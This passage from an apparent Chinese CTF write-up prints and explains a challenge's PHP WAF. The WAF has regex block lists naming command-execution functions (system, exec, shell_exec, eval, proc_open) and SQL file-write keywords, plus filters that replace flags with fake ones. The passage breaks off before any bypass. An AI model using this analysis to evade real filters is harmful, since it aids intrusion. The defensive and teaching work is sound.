class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-comment">//config</span><br><span class="hljs-variable">$sql_blacklist</span> = <span class="hljs-string">&quot;/drop\s*|dumpfile\s*|INTO FILE\s*|outfile\s*|load_file\s*|multipoint\s*/i&quot;</span>;<br><span class="hljs-variable">$rce_blacklist</span> = <span class="hljs-string">&quot;/(var_dump|str_rot13|serialize|base64_encode|base64_decode|strrev|eval|assert|file_put_contents|fwrite|curl_exec|passthru|exec|dl|readlink|popepassthru|preg_replace|create_function|array_map|call_user_func|call_user_func_array|array_filter|usort|stream_socket_server|pcntl_exec|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|ini_set|LD_PRELOAD|ini_alter|ini_restore|ini_set)\s*\(/i&quot;</span>;<br><span class="hljs-variable">$key_blacklist</span>=<span class="hljs-string">&quot;/_GET|_POST|_COOKIE|_FILE|_SERVER|_SESSION|flag|waf/i&quot;</span>;<br><br><span class="hljs-variable">$config2333</span>=[<br>    <span class="hljs-string">&quot;cachestore&quot;</span>=&gt;<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;flagFormat&quot;</span>=&gt;<span class="hljs-string">&quot;ROIS&quot;</span>,<span class="hljs-comment">//=&gt; /ROIS&#123;643124e14ecfc643124e14ecff&#125;/i</span><br>    <span class="hljs-string">&quot;filterFunc&quot;</span>=&gt;[<br>        <span class="hljs-string">&quot;fileterOriginFlag&quot;</span>,<br>        <span class="hljs-string">&quot;fileterBase64Flag&quot;</span><br>    ],<br>    <span class="hljs-string">&quot;filterInputRule&quot;</span>=&gt;[<br>        <span class="hljs-variable">$sql_blacklist</span>,<br>        <span class="hljs-variable">$rce_blacklist</span>,<br>        <span class="hljs-variable">$key_blacklist</span><br>    ],<span class="hljs-comment">//filter input</span><br>    <span class="hljs-string">&quot;fileFilter&quot;</span>=&gt;<span class="hljs-literal">true</span><br>];<br><br><span class="hljs-comment">//config ends</span><br><br><span class="hljs-keyword">if</span>(!<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>])&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(PHP_OS,<span class="hljs-string">&quot;WIN&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-comment">//Linux</span><br>        <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>]=<span class="hljs-string">&quot;/tmp/cached&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-comment">//Windows</span><br>        <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>]=<span class="hljs-string">&quot;cached&quot;</span>;<br>    &#125;<br>&#125;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>]))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>]);<br>    <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>] = <span class="hljs-title function_ invoke__">realpath</span>(<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>]);<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CacheWaf</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$config2333</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$config2333</span></span>) </span>&#123;<br><br>        <span class="hljs-variable language_">$this</span>-&gt;config2333 = <span class="hljs-variable">$config2333</span>;<br><br><br>        <span class="hljs-comment">//check cache exists</span><br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">cacheExists</span>(<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">reqid</span>());<br><br>        <span class="hljs-comment">//filter input</span><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;config2333[<span class="hljs-string">&quot;filterInputRule&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$black_list</span>)&#123;<br>            <span class="hljs-variable">$_GET</span>=<span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-variable">$_GET</span>);<br>            <span class="hljs-variable">$_POST</span>=<span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-variable">$_POST</span>);<br>            <span class="hljs-variable">$_COOKIE</span>=<span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-variable">$_COOKIE</span>);<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_SERVER</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt;&amp;<span class="hljs-variable">$value</span>)&#123;<br>                <span class="hljs-variable">$value</span> = <span class="hljs-title function_ invoke__">strong_replace</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$value</span>);<br>            &#125;<br>            <span class="hljs-variable">$_SESSION</span>=<span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-variable">$_SESSION</span>);<br>            <span class="hljs-variable">$_FILES</span>=<span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-variable">$_FILES</span>);<br><br>        &#125;<br><br>        <span class="hljs-comment">//filter upload file</span><br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;config2333[<span class="hljs-string">&quot;fileFilter&quot;</span>])&#123;<br>            <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)&#123;<br>                        <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$v</span>);<br>                        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;config2333[<span class="hljs-string">&quot;filterInputRule&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$black_list</span>)&#123;<br>                            <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">strong_replace</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$fileCon</span>);<br>                        &#125;<br>                        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$v</span>,<span class="hljs-variable">$fileCon</span>);<br>                    &#125;<br><br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>                    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;config2333[<span class="hljs-string">&quot;filterInputRule&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$black_list</span>)&#123;<br>                        <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">strong_replace</span>(<span class="hljs-variable">$black_list</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$fileCon</span>);<br>                    &#125;<br>                    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$value</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>],<span class="hljs-variable">$fileCon</span>);<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-comment">//cache start</span><br><br>        <span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-string">&quot;cacheCtrl&quot;</span>);<br><br><br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        @<span class="hljs-title function_ invoke__">ob_end_flush</span>();<br><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cacheExists</span>(<span class="hljs-params"><span class="hljs-variable">$reqid</span></span>)</span>&#123;<br>        <span class="hljs-variable">$cacheFilePath</span>=<span class="hljs-variable language_">$this</span>-&gt;config2333[<span class="hljs-string">&quot;cachestore&quot;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$reqid</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$cacheFilePath</span>))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$cacheFilePath</span>));<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reqid</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_COOKIE</span>;<br>        <span class="hljs-variable">$get</span> = <span class="hljs-variable">$_GET</span>;<br>        <span class="hljs-variable">$requri</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;SCRIPT_NAME&quot;</span>];<br>        <span class="hljs-variable">$post</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&quot;php://input&quot;</span>);<br>        <span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_FILES</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$value</span>) &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;<br>                <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$k</span>=&gt;<span class="hljs-variable">$v</span>)&#123;<br>                    <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$v</span>);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$fileCon</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>[<span class="hljs-string">&quot;tmp_name&quot;</span>]);<br>            &#125;<br>            <span class="hljs-variable">$file</span>.=<span class="hljs-variable">$fileCon</span>;<br>        &#125;<br>        <span class="hljs-title function_ invoke__">sort</span>(<span class="hljs-variable">$cookie</span>);<br>        <span class="hljs-title function_ invoke__">sort</span>(<span class="hljs-variable">$get</span>);<br>        <span class="hljs-variable">$idcon</span>=<span class="hljs-variable">$requri</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-variable">$cookie</span>).<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-variable">$get</span>).<span class="hljs-variable">$post</span>.<span class="hljs-variable">$file</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$idcon</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fileterOriginFlag</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span></span>)</span>&#123;<br>    <span class="hljs-variable">$buffer</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$flagFormat</span>.<span class="hljs-string">&quot;&#123;.*&#125;/im&quot;</span>,<br>        <span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$buffer</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$buffer</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fileterBase64Flag</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span></span>)</span>&#123;<br>    <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$flagFormat</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-string">&quot;==&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">3</span>);<br>    &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-string">&quot;=&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$base64flag</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$buffer</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#<span class="hljs-subst">$base64flag</span>&quot;</span>.<span class="hljs-string">&quot;[0-9a-zA-Z/+]+#&quot;</span>,<br>            <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$fakeflag</span>),<span class="hljs-variable">$buffer</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$buffer</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strong_replace</span> (<span class="hljs-params"><span class="hljs-variable">$rule</span>,<span class="hljs-variable">$replace</span>,<span class="hljs-variable">$str</span></span>)</span>&#123;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-literal">true</span>)&#123;<br>        <span class="hljs-variable">$tmpstr</span> = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-variable">$rule</span>,<span class="hljs-variable">$replace</span>,<span class="hljs-variable">$str</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$tmpstr</span> === <span class="hljs-variable">$str</span>)&#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <span class="hljs-variable">$str</span> = <span class="hljs-variable">$tmpstr</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_arr</span>(<span class="hljs-params"><span class="hljs-variable">$rule</span>,<span class="hljs-variable">$arr</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$arr</span>===<span class="hljs-literal">null</span>)<span class="hljs-keyword">return</span> <span class="hljs-variable">$arr</span>;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$arr</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span> =&gt; <span class="hljs-variable">$val</span>)&#123;<br>        <span class="hljs-comment">//filter $key</span><br>        <span class="hljs-variable">$tmpkey</span>=<span class="hljs-title function_ invoke__">strong_replace</span>(<span class="hljs-variable">$rule</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$key</span>);<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$val</span>))&#123;<br>            <span class="hljs-variable">$tmpval</span> = <span class="hljs-title function_ invoke__">filter_arr</span>(<span class="hljs-variable">$rule</span>,<span class="hljs-variable">$val</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$tmpval</span> = <span class="hljs-title function_ invoke__">strong_replace</span>(<span class="hljs-variable">$rule</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$val</span>);<br>        &#125;<br>        <span class="hljs-keyword">unset</span>(<span class="hljs-variable">$arr</span>[<span class="hljs-variable">$key</span>]);<br><br>        <span class="hljs-variable">$arr</span>[<span class="hljs-variable">$tmpkey</span>] =  <span class="hljs-variable">$tmpval</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$arr</span>;<br><br>&#125;<br><br><br><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cacheCtrl</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span></span>) </span>&#123;<br>    <span class="hljs-comment">//filter output</span><br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>]));<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$config2333</span>;<br>    <span class="hljs-variable">$uniqid</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-title function_ invoke__">uniqid</span>();<br>    <span class="hljs-variable">$fakeflag</span> = <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;flagFormat&quot;</span>].<span class="hljs-string">&quot;&#123;<span class="hljs-subst">&#123;$uniqid&#125;</span>&#125;&quot;</span>;<br>    <span class="hljs-variable">$flagFormat</span> = <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;flagFormat&quot;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;filterFunc&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>)&#123;<br>        <span class="hljs-variable">$buffer</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span>);<br>    &#125;<br><br><br>    <span class="hljs-comment">//cahce</span><br>    <span class="hljs-variable">$cacheFilePath</span>=<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;cachestore&quot;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title class_">CacheWaf</span>::<span class="hljs-title function_ invoke__">reqid</span>();<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$cacheFilePath</span>,<span class="hljs-variable">$buffer</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$buffer</span>;<br><br>&#125;<br><br><span class="hljs-keyword">global</span> <span class="hljs-variable">$cache23333</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$cache23333</span> === <span class="hljs-literal">null</span>)&#123;<br>    <span class="hljs-variable">$cache23333</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CacheWaf</span>(<span class="hljs-variable">$config2333</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>开幕雷击只能说是，一开头就被ban掉了一堆东西</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql_blacklist</span> = <span class="hljs-string">&quot;/drop\s*|dumpfile\s*|INTO FILE\s*|outfile\s*|load_file\s*|multipoint\s*/i&quot;</span>;<br><span class="hljs-variable">$rce_blacklist</span> = <span class="hljs-string">&quot;/(var_dump|str_rot13|serialize|base64_encode|base64_decode|strrev|eval|assert|file_put_contents|fwrite|curl_exec|passthru|exec|dl|readlink|popepassthru|preg_replace|create_function|array_map|call_user_func|call_user_func_array|array_filter|usort|stream_socket_server|pcntl_exec|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore|ini_set|LD_PRELOAD|ini_alter|ini_restore|ini_set)\s*\(/i&quot;</span>;<span class="hljs-comment">#rce防火墙</span><br><span class="hljs-variable">$key_blacklist</span>=<span class="hljs-string">&quot;/_GET|_POST|_COOKIE|_FILE|_SERVER|_SESSION|flag|waf/i&quot;</span>;<span class="hljs-comment">#关键字防火墙,，&quot;flag&quot;、&quot;waf&quot;均被ban</span><br></code></pre></td></tr></table></figure><p>定义了一个配置数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$config2333</span>=[<br>    <span class="hljs-string">&quot;cachestore&quot;</span>=&gt;<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;flagFormat&quot;</span>=&gt;<span class="hljs-string">&quot;ROIS&quot;</span>,<span class="hljs-comment">//=&gt; /ROIS&#123;643124e14ecfc643124e14ecff&#125;/i</span><br>    <span class="hljs-string">&quot;filterFunc&quot;</span>=&gt;[<br>        <span class="hljs-string">&quot;fileterOriginFlag&quot;</span>,<br>        <span class="hljs-string">&quot;fileterBase64Flag&quot;</span><br>    ],<br>    <span class="hljs-string">&quot;filterInputRule&quot;</span>=&gt;[<br>        <span class="hljs-variable">$sql_blacklist</span>,<br>        <span class="hljs-variable">$rce_blacklist</span>,<br>        <span class="hljs-variable">$key_blacklist</span><br>    ],<span class="hljs-comment">//filter input</span><br>    <span class="hljs-string">&quot;fileFilter&quot;</span>=&gt;<span class="hljs-literal">true</span><br>];<br></code></pre></td></tr></table></figure><p>看到了可疑内容filterFunc(过滤方法)和filterInputRule(过滤输入)，先看下filterFunc里的两个函数分别干啥的吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fileterOriginFlag</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span></span>)</span>&#123;<span class="hljs-comment">#line127</span><br>    <span class="hljs-variable">$buffer</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$flagFormat</span>.<span class="hljs-string">&quot;&#123;.*&#125;/im&quot;</span>,<br>        <span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$buffer</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$buffer</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>fileterOriginFlag(过滤原flag):传入$buffer、$fakeflag、$flagFormat，$flagFormat是”ROIS”。preg_replace()中的内容也就是把$buffer中ROIS{.*}形式的替换成假flag然后将返回的假flag赋值给$buffer，最终函数返回$buffer。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fileterBase64Flag</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span></span>)</span>&#123;<span class="hljs-comment">#line133</span><br>    <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$flagFormat</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-string">&quot;==&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">3</span>);<br>    &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-string">&quot;=&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$base64flag</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$base64flag</span>,<span class="hljs-number">0</span>,-<span class="hljs-number">2</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$base64flag</span>)!==<span class="hljs-literal">false</span>)&#123;<br>        <span class="hljs-variable">$buffer</span>=<span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;#<span class="hljs-subst">$base64flag</span>&quot;</span>.<span class="hljs-string">&quot;[0-9a-zA-Z/+]+#&quot;</span>,<br>            <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$fakeflag</span>),<span class="hljs-variable">$buffer</span>);<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$buffer</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>其实和fileterOriginFlag()的作用差不多，但是多了一些截取base64编码中非”&#x3D;&#x3D;”和”&#x3D;”的部分的步骤。总体的意思也是将base64形式的flag替换成假的flag。</p><p>接下来看看这两个函数在waf中的位置，单独查函数名查不到，查filterFunc</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cacheCtrl</span>(<span class="hljs-params"><span class="hljs-variable">$buffer</span></span>) </span>&#123;<span class="hljs-comment">#line180</span><br>    <span class="hljs-comment">//filter output</span><br>    <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;SCRIPT_FILENAME&#x27;</span>]));<span class="hljs-comment">#chdir()改变当前目录，dirname()返回绝对路径，$_SERVER[&#x27;SCRIPT_FILENAME&#x27;]为当前执行脚本的绝对路径。(https://www.php.net/manual/zh/reserved.variables.server.php)</span><br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$config2333</span>;<br>    <span class="hljs-variable">$uniqid</span> = <span class="hljs-title function_ invoke__">uniqid</span>().<span class="hljs-title function_ invoke__">uniqid</span>();<span class="hljs-comment">#uniqid()基于以微秒计的当前时间，生成一个唯一的 ID。</span><br>    <span class="hljs-variable">$fakeflag</span> = <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;flagFormat&quot;</span>].<span class="hljs-string">&quot;&#123;<span class="hljs-subst">&#123;$uniqid&#125;</span>&#125;&quot;</span>;<br>    <span class="hljs-variable">$flagFormat</span> = <span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;flagFormat&quot;</span>];<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$config2333</span>[<span class="hljs-string">&quot;filterFunc&quot;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$filter</span>)&#123;<br>        <span class="hljs-variable">$buffer</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$filter</span>,<span class="hljs-variable">$buffer</span>,<span class="hljs-variable">$fakeflag</span>,<span class="hljs-variable">$flagFormat</span>);<br>    &#125;<span class="hljs-comment">#依次执行那两个过滤函数</span><br></code></pre></td></tr></table></figure><p>然后看下这个cacheCtrl()在waf中的作用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">ob_start</span>(<span class="hljs-string">&quot;cacheCtrl&quot;</span>);<span 